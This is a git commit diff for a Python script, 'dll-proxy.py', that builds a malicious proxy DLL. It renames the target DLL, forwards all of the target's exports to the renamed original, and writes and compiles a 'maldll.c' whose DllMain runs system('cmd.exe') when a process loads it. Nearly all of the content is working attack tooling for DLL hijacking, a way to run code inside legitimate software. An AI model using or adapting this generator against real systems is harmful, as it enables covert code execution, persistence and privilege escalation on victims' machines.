046ce73e2b9749f1d5c1452f3cfe4e4b4d661339
AlienX <64488123+AlienX2001@users.noreply.github.com>
2022-05-05 11:14:21 +0530

    Update dll-proxy.py

--- dll-proxy.py
+++ dll-proxy.py
@@ -2,12 +2,19 @@ import pefile
 import sys
 import os
 
-dll = pefile.PE(sys.argv[1])
+newfile = sys.argv[1].split(".")
+newfile = newfile[0]+'_old.dll'
+os.system("mv "+sys.argv[1]+" "+newfile)
+
+print("Changed original DLL filename")
+
+dll = pefile.PE(newfile)
 pragmas=""
-print("EXPORTS")
 for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
     if export.name:
-        pragmas += '\n#pragma comment(linker,"/export:{}=target_orig.{} @{}"'.format(export.name.decode(), export.name.decode(), export.ordinal)
+        pragmas += '\n#pragma comment(linker,"/export:{}={}.{} @{}"'.format(export.name.decode(), newfile.split(".")[0], export.name.decode(), export.ordinal)
+
+print("Extracted all exportable functions")
 
 code = """
 #include <windows.h>
@@ -19,7 +26,7 @@ BOOL WINAPI DllMain(HANDLE hModule, DWORD  fdwReason, LPVOID lpReserved)
         {
                 case DLL_PROCESS_ATTACH:
                         puts("Do process-specific initialization...");
-                        system("cmd.exe");
+			system("cmd.exe");
                         break;
                 case DLL_THREAD_ATTACH:
                         puts("Do thread-specific initialization...");
@@ -38,9 +45,10 @@ BOOL WINAPI DllMain(HANDLE hModule, DWORD  fdwReason, LPVOID lpReserved)
 with open("maldll.c","w") as f:
     f.write(code)
 
+print("Writtedn .c file to disk")
 
-newfile = sys.argv[1].split(".")
-newfile = newfile[0]+'_old.dll'
-
-os.system("mv "+sys.argv[1]+" "+newfile)
 os.system('x86_64-w64-mingw32-gcc-win32 -o {} maldll.c -shared'.format(sys.argv[1]))
+
+print("Compiled the DLL")
+
+print("All Done")
